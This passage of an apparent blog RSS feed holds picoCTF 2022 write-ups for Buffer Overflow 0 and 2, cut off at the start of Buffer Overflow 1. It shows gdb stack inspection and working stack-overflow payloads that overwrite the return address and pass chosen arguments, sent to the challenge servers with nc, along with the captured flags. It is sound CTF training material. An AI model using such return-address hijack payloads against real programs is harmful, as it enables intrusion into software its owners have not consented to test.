d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Let's take a look at the stack:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) i r esp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">esp            0xffffcac0          0xffffcac0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) i r ebp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ebp            0xffffcadc          0xffffcadc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So we can see that the stack starts at <code>0xffffcac0</code> and ends at <code>0xffffcadc</code> meaning the stack size is 1C (in hex) or 28 (decimal).</p>
<p>If we print out the stack contents, we can see that we're one word (8 bytes) short of overwriting the <code>EBP</code>:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) x/20x $esp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffcac0:     0xffffcac8      0xffffcae8      0x55555555      0x55555555</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffcad0:     0x55555555      0x55555555      0x55555555      0xffffcb00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) x/x $ebp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffcadc:     0xffffcb00</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So we need to increase the fuzzing by 4 characters (each character is 2 bytes) so we can overwrite the whole stack. Let's change the 4 letters from <code>U</code> to <code>A</code> so it's easier to see when examining memory:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) r </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting program: ~/ctf/pico_2022/binary_exploitation/buffer_overflow_0/vuln </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Input: UUUUUUUUUUUUUUUUUUUUAAAA </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Breakpoint 1, 0x08049e62 in vuln (input=0xffffcae8 'U' &lt;repeats 20 times&gt;, "AAAA") at vuln.c:18</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">18        strcpy(buf2, input);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) x/20x $esp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffcac0:     0xffffcac8      0xffffcae8      0x55555555      0x55555555</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffcad0:     0x55555555      0x55555555      0x55555555      0x41414141</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffcae0:     0x08049f00      0xffffcae8      0x55555555      0x55555555</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can see from the output that the <code>EBP</code> has <code>0x41414141</code> (<code>41</code> is ASCII code for <code>A</code>).</p>
<p>Now that we overwrote/oveflowed the stack, we can overwrite the return address (which is the next <code>word</code> after the <code>EBP</code>). To find this address, we first need to check where the flag is actually printed.</p>
<p>Reviewing the source code, we see that it happens on the first line after the signal handler function is invoked (line 11):</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sigsegv_handler</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> sig</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"%s\n"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can get the flag by having a buffer larger than 64 bytes:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc saturn.picoctf.net 53935</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Input: UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Buffer Overflow 2]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_2/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_2/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Description]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_2/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>Control the return address and arguments.</p>
<p>This time you'll need to control the arguments to the function you return to! Can you get the flag from this <a href="https://artifacts.picoctf.net/c/344/vuln" target="_blank" rel="noopener noreferrer">program</a>?</p>
<p>You can view source <a href="https://artifacts.picoctf.net/c/344/vuln.c" target="_blank" rel="noopener noreferrer">here</a>.</p>
<p>And connect with it using</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc saturn.picoctf.net 50918</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploitation">Exploitation<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_2/README#exploitation" class="hash-link" aria-label="Direct link to Exploitation" title="Direct link to Exploitation">​</a></h2>
<p>After fuzzing, we can see that the segmentation fault is at address <code>0x34333231</code> (the instructon pointer is pointing to that space in memory):</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&gt; cat &lt;(python2 -c "print('U' * 112 + '1234')") | ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your string: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU1234</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[1]    285183 done                              cat &lt;(python2 -c "print('U' * 112 + '1234')") | </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       285184 segmentation fault (core dumped)  ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; dmesg | grep vuln | tail -1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[207149.111460] vuln[285239]: segfault at 34333231 ip 0000000034333231 sp 00000000ffffca30 error 14 in libc-2.31.so[f7dc5000+19000]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Since we want to jump to implant the memory location where the <code>win</code> function starts, we can use the following command to find the memory address and then convert it into little Endian so we can send it into the payload:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Get memory address of win function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN_MEM_LOCATION=0x`readelf -s vuln | grep win | cut -d" " -f6` # 08049296</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 -c "import struct;print(struct.pack('&lt;I', $WIN_MEM_LOCATION))"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">b'\x96\x92\x04\x08'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Adding the <code>win</code> address into the payload, we can see that the <code>win</code> function is actually called:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat &lt;(python2 -c "print('U' * 112 + '\x96\x92\x04\x08')") | ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your string: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please create 'flag.txt' in this directory with your own debugging flag.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Let's create the flag locally and try again to see what happens:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">❯ cat &lt;(python2 -c "print('U' * 112 + '\x96\x92\x04\x08')") | ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your string: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[1]    286421 done                              cat &lt;(python2 -c "print('U' * 112 + '\x96\x92\x04\x08')") | </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       286422 segmentation fault (core dumped)  ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">❯ dmesg | grep vuln | tail -1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[208481.875568] vuln[286422]: segfault at 0 ip 0000000000000000 sp 00000000ffffca34 error 14 in vuln[8048000+1000]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This time it crashes because we didn't supply a return address to the <code>win</code> function. 4 bytes after the <code>EBP</code> is the <code>RET</code> address. 4 bytes after that is the first argument and another 4 bytes after that is the second argument.</p>
<p><img decoding="async" loading="lazy" src="https://i.stack.imgur.com/w19l1.png" alt="" class="img_ev3q"></p>
<p>Since in this case we don't really care about the return address, we can put anything in there. If we review the source code for the <code>win</code> function, we can see that it's expecting 2 arguments:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">arg1 </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xCAFEF00D</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">arg2 </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xF00DF00D</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So let's convert these memory addresses into little Endian as well:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">struct</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">pack</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'&lt;I'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xCAFEF00D</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">b'\r\xf0\xfe\xca'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">struct</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">pack</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'&lt;I'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xF00DF00D</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">b'\r\xf0\r\xf0'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And them to the payload after the fuzzed return address to get the flag:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&gt; cat &lt;(python2 -c "print('U' * 112 + '\x96\x92\x04\x08' + 'UUUU' '\r\xf0\xfe\xca' + '\r\xf0\r\xf0')") | ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your string: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">picoCTF{some_flag}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[1]    285206 done                              cat  | </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       285207 segmentation fault (core dumped)  ./vuln</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And on the remote server:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> cat &lt;(python2 -c "print('U' * 112 + '\x96\x92\x04\x08' + 'UUUU' '\r\xf0\xfe\xca' + '\r\xf0\r\xf0')") | nc saturn.picoctf.net 57551</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your string: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">picoCTF{argum3nt5_4_d4yZ_b3fd8f66}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Buffer Overflow 1]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_1/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_1/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Description]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_1/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>Control the return address.</p>
<p>Now we're cooking! You can overflow the buffer and return to the flag function in the <a href="https://artifacts.picoctf.net/c/250/vuln" target="_blank" rel="noopener noreferrer">program</a>.</p>
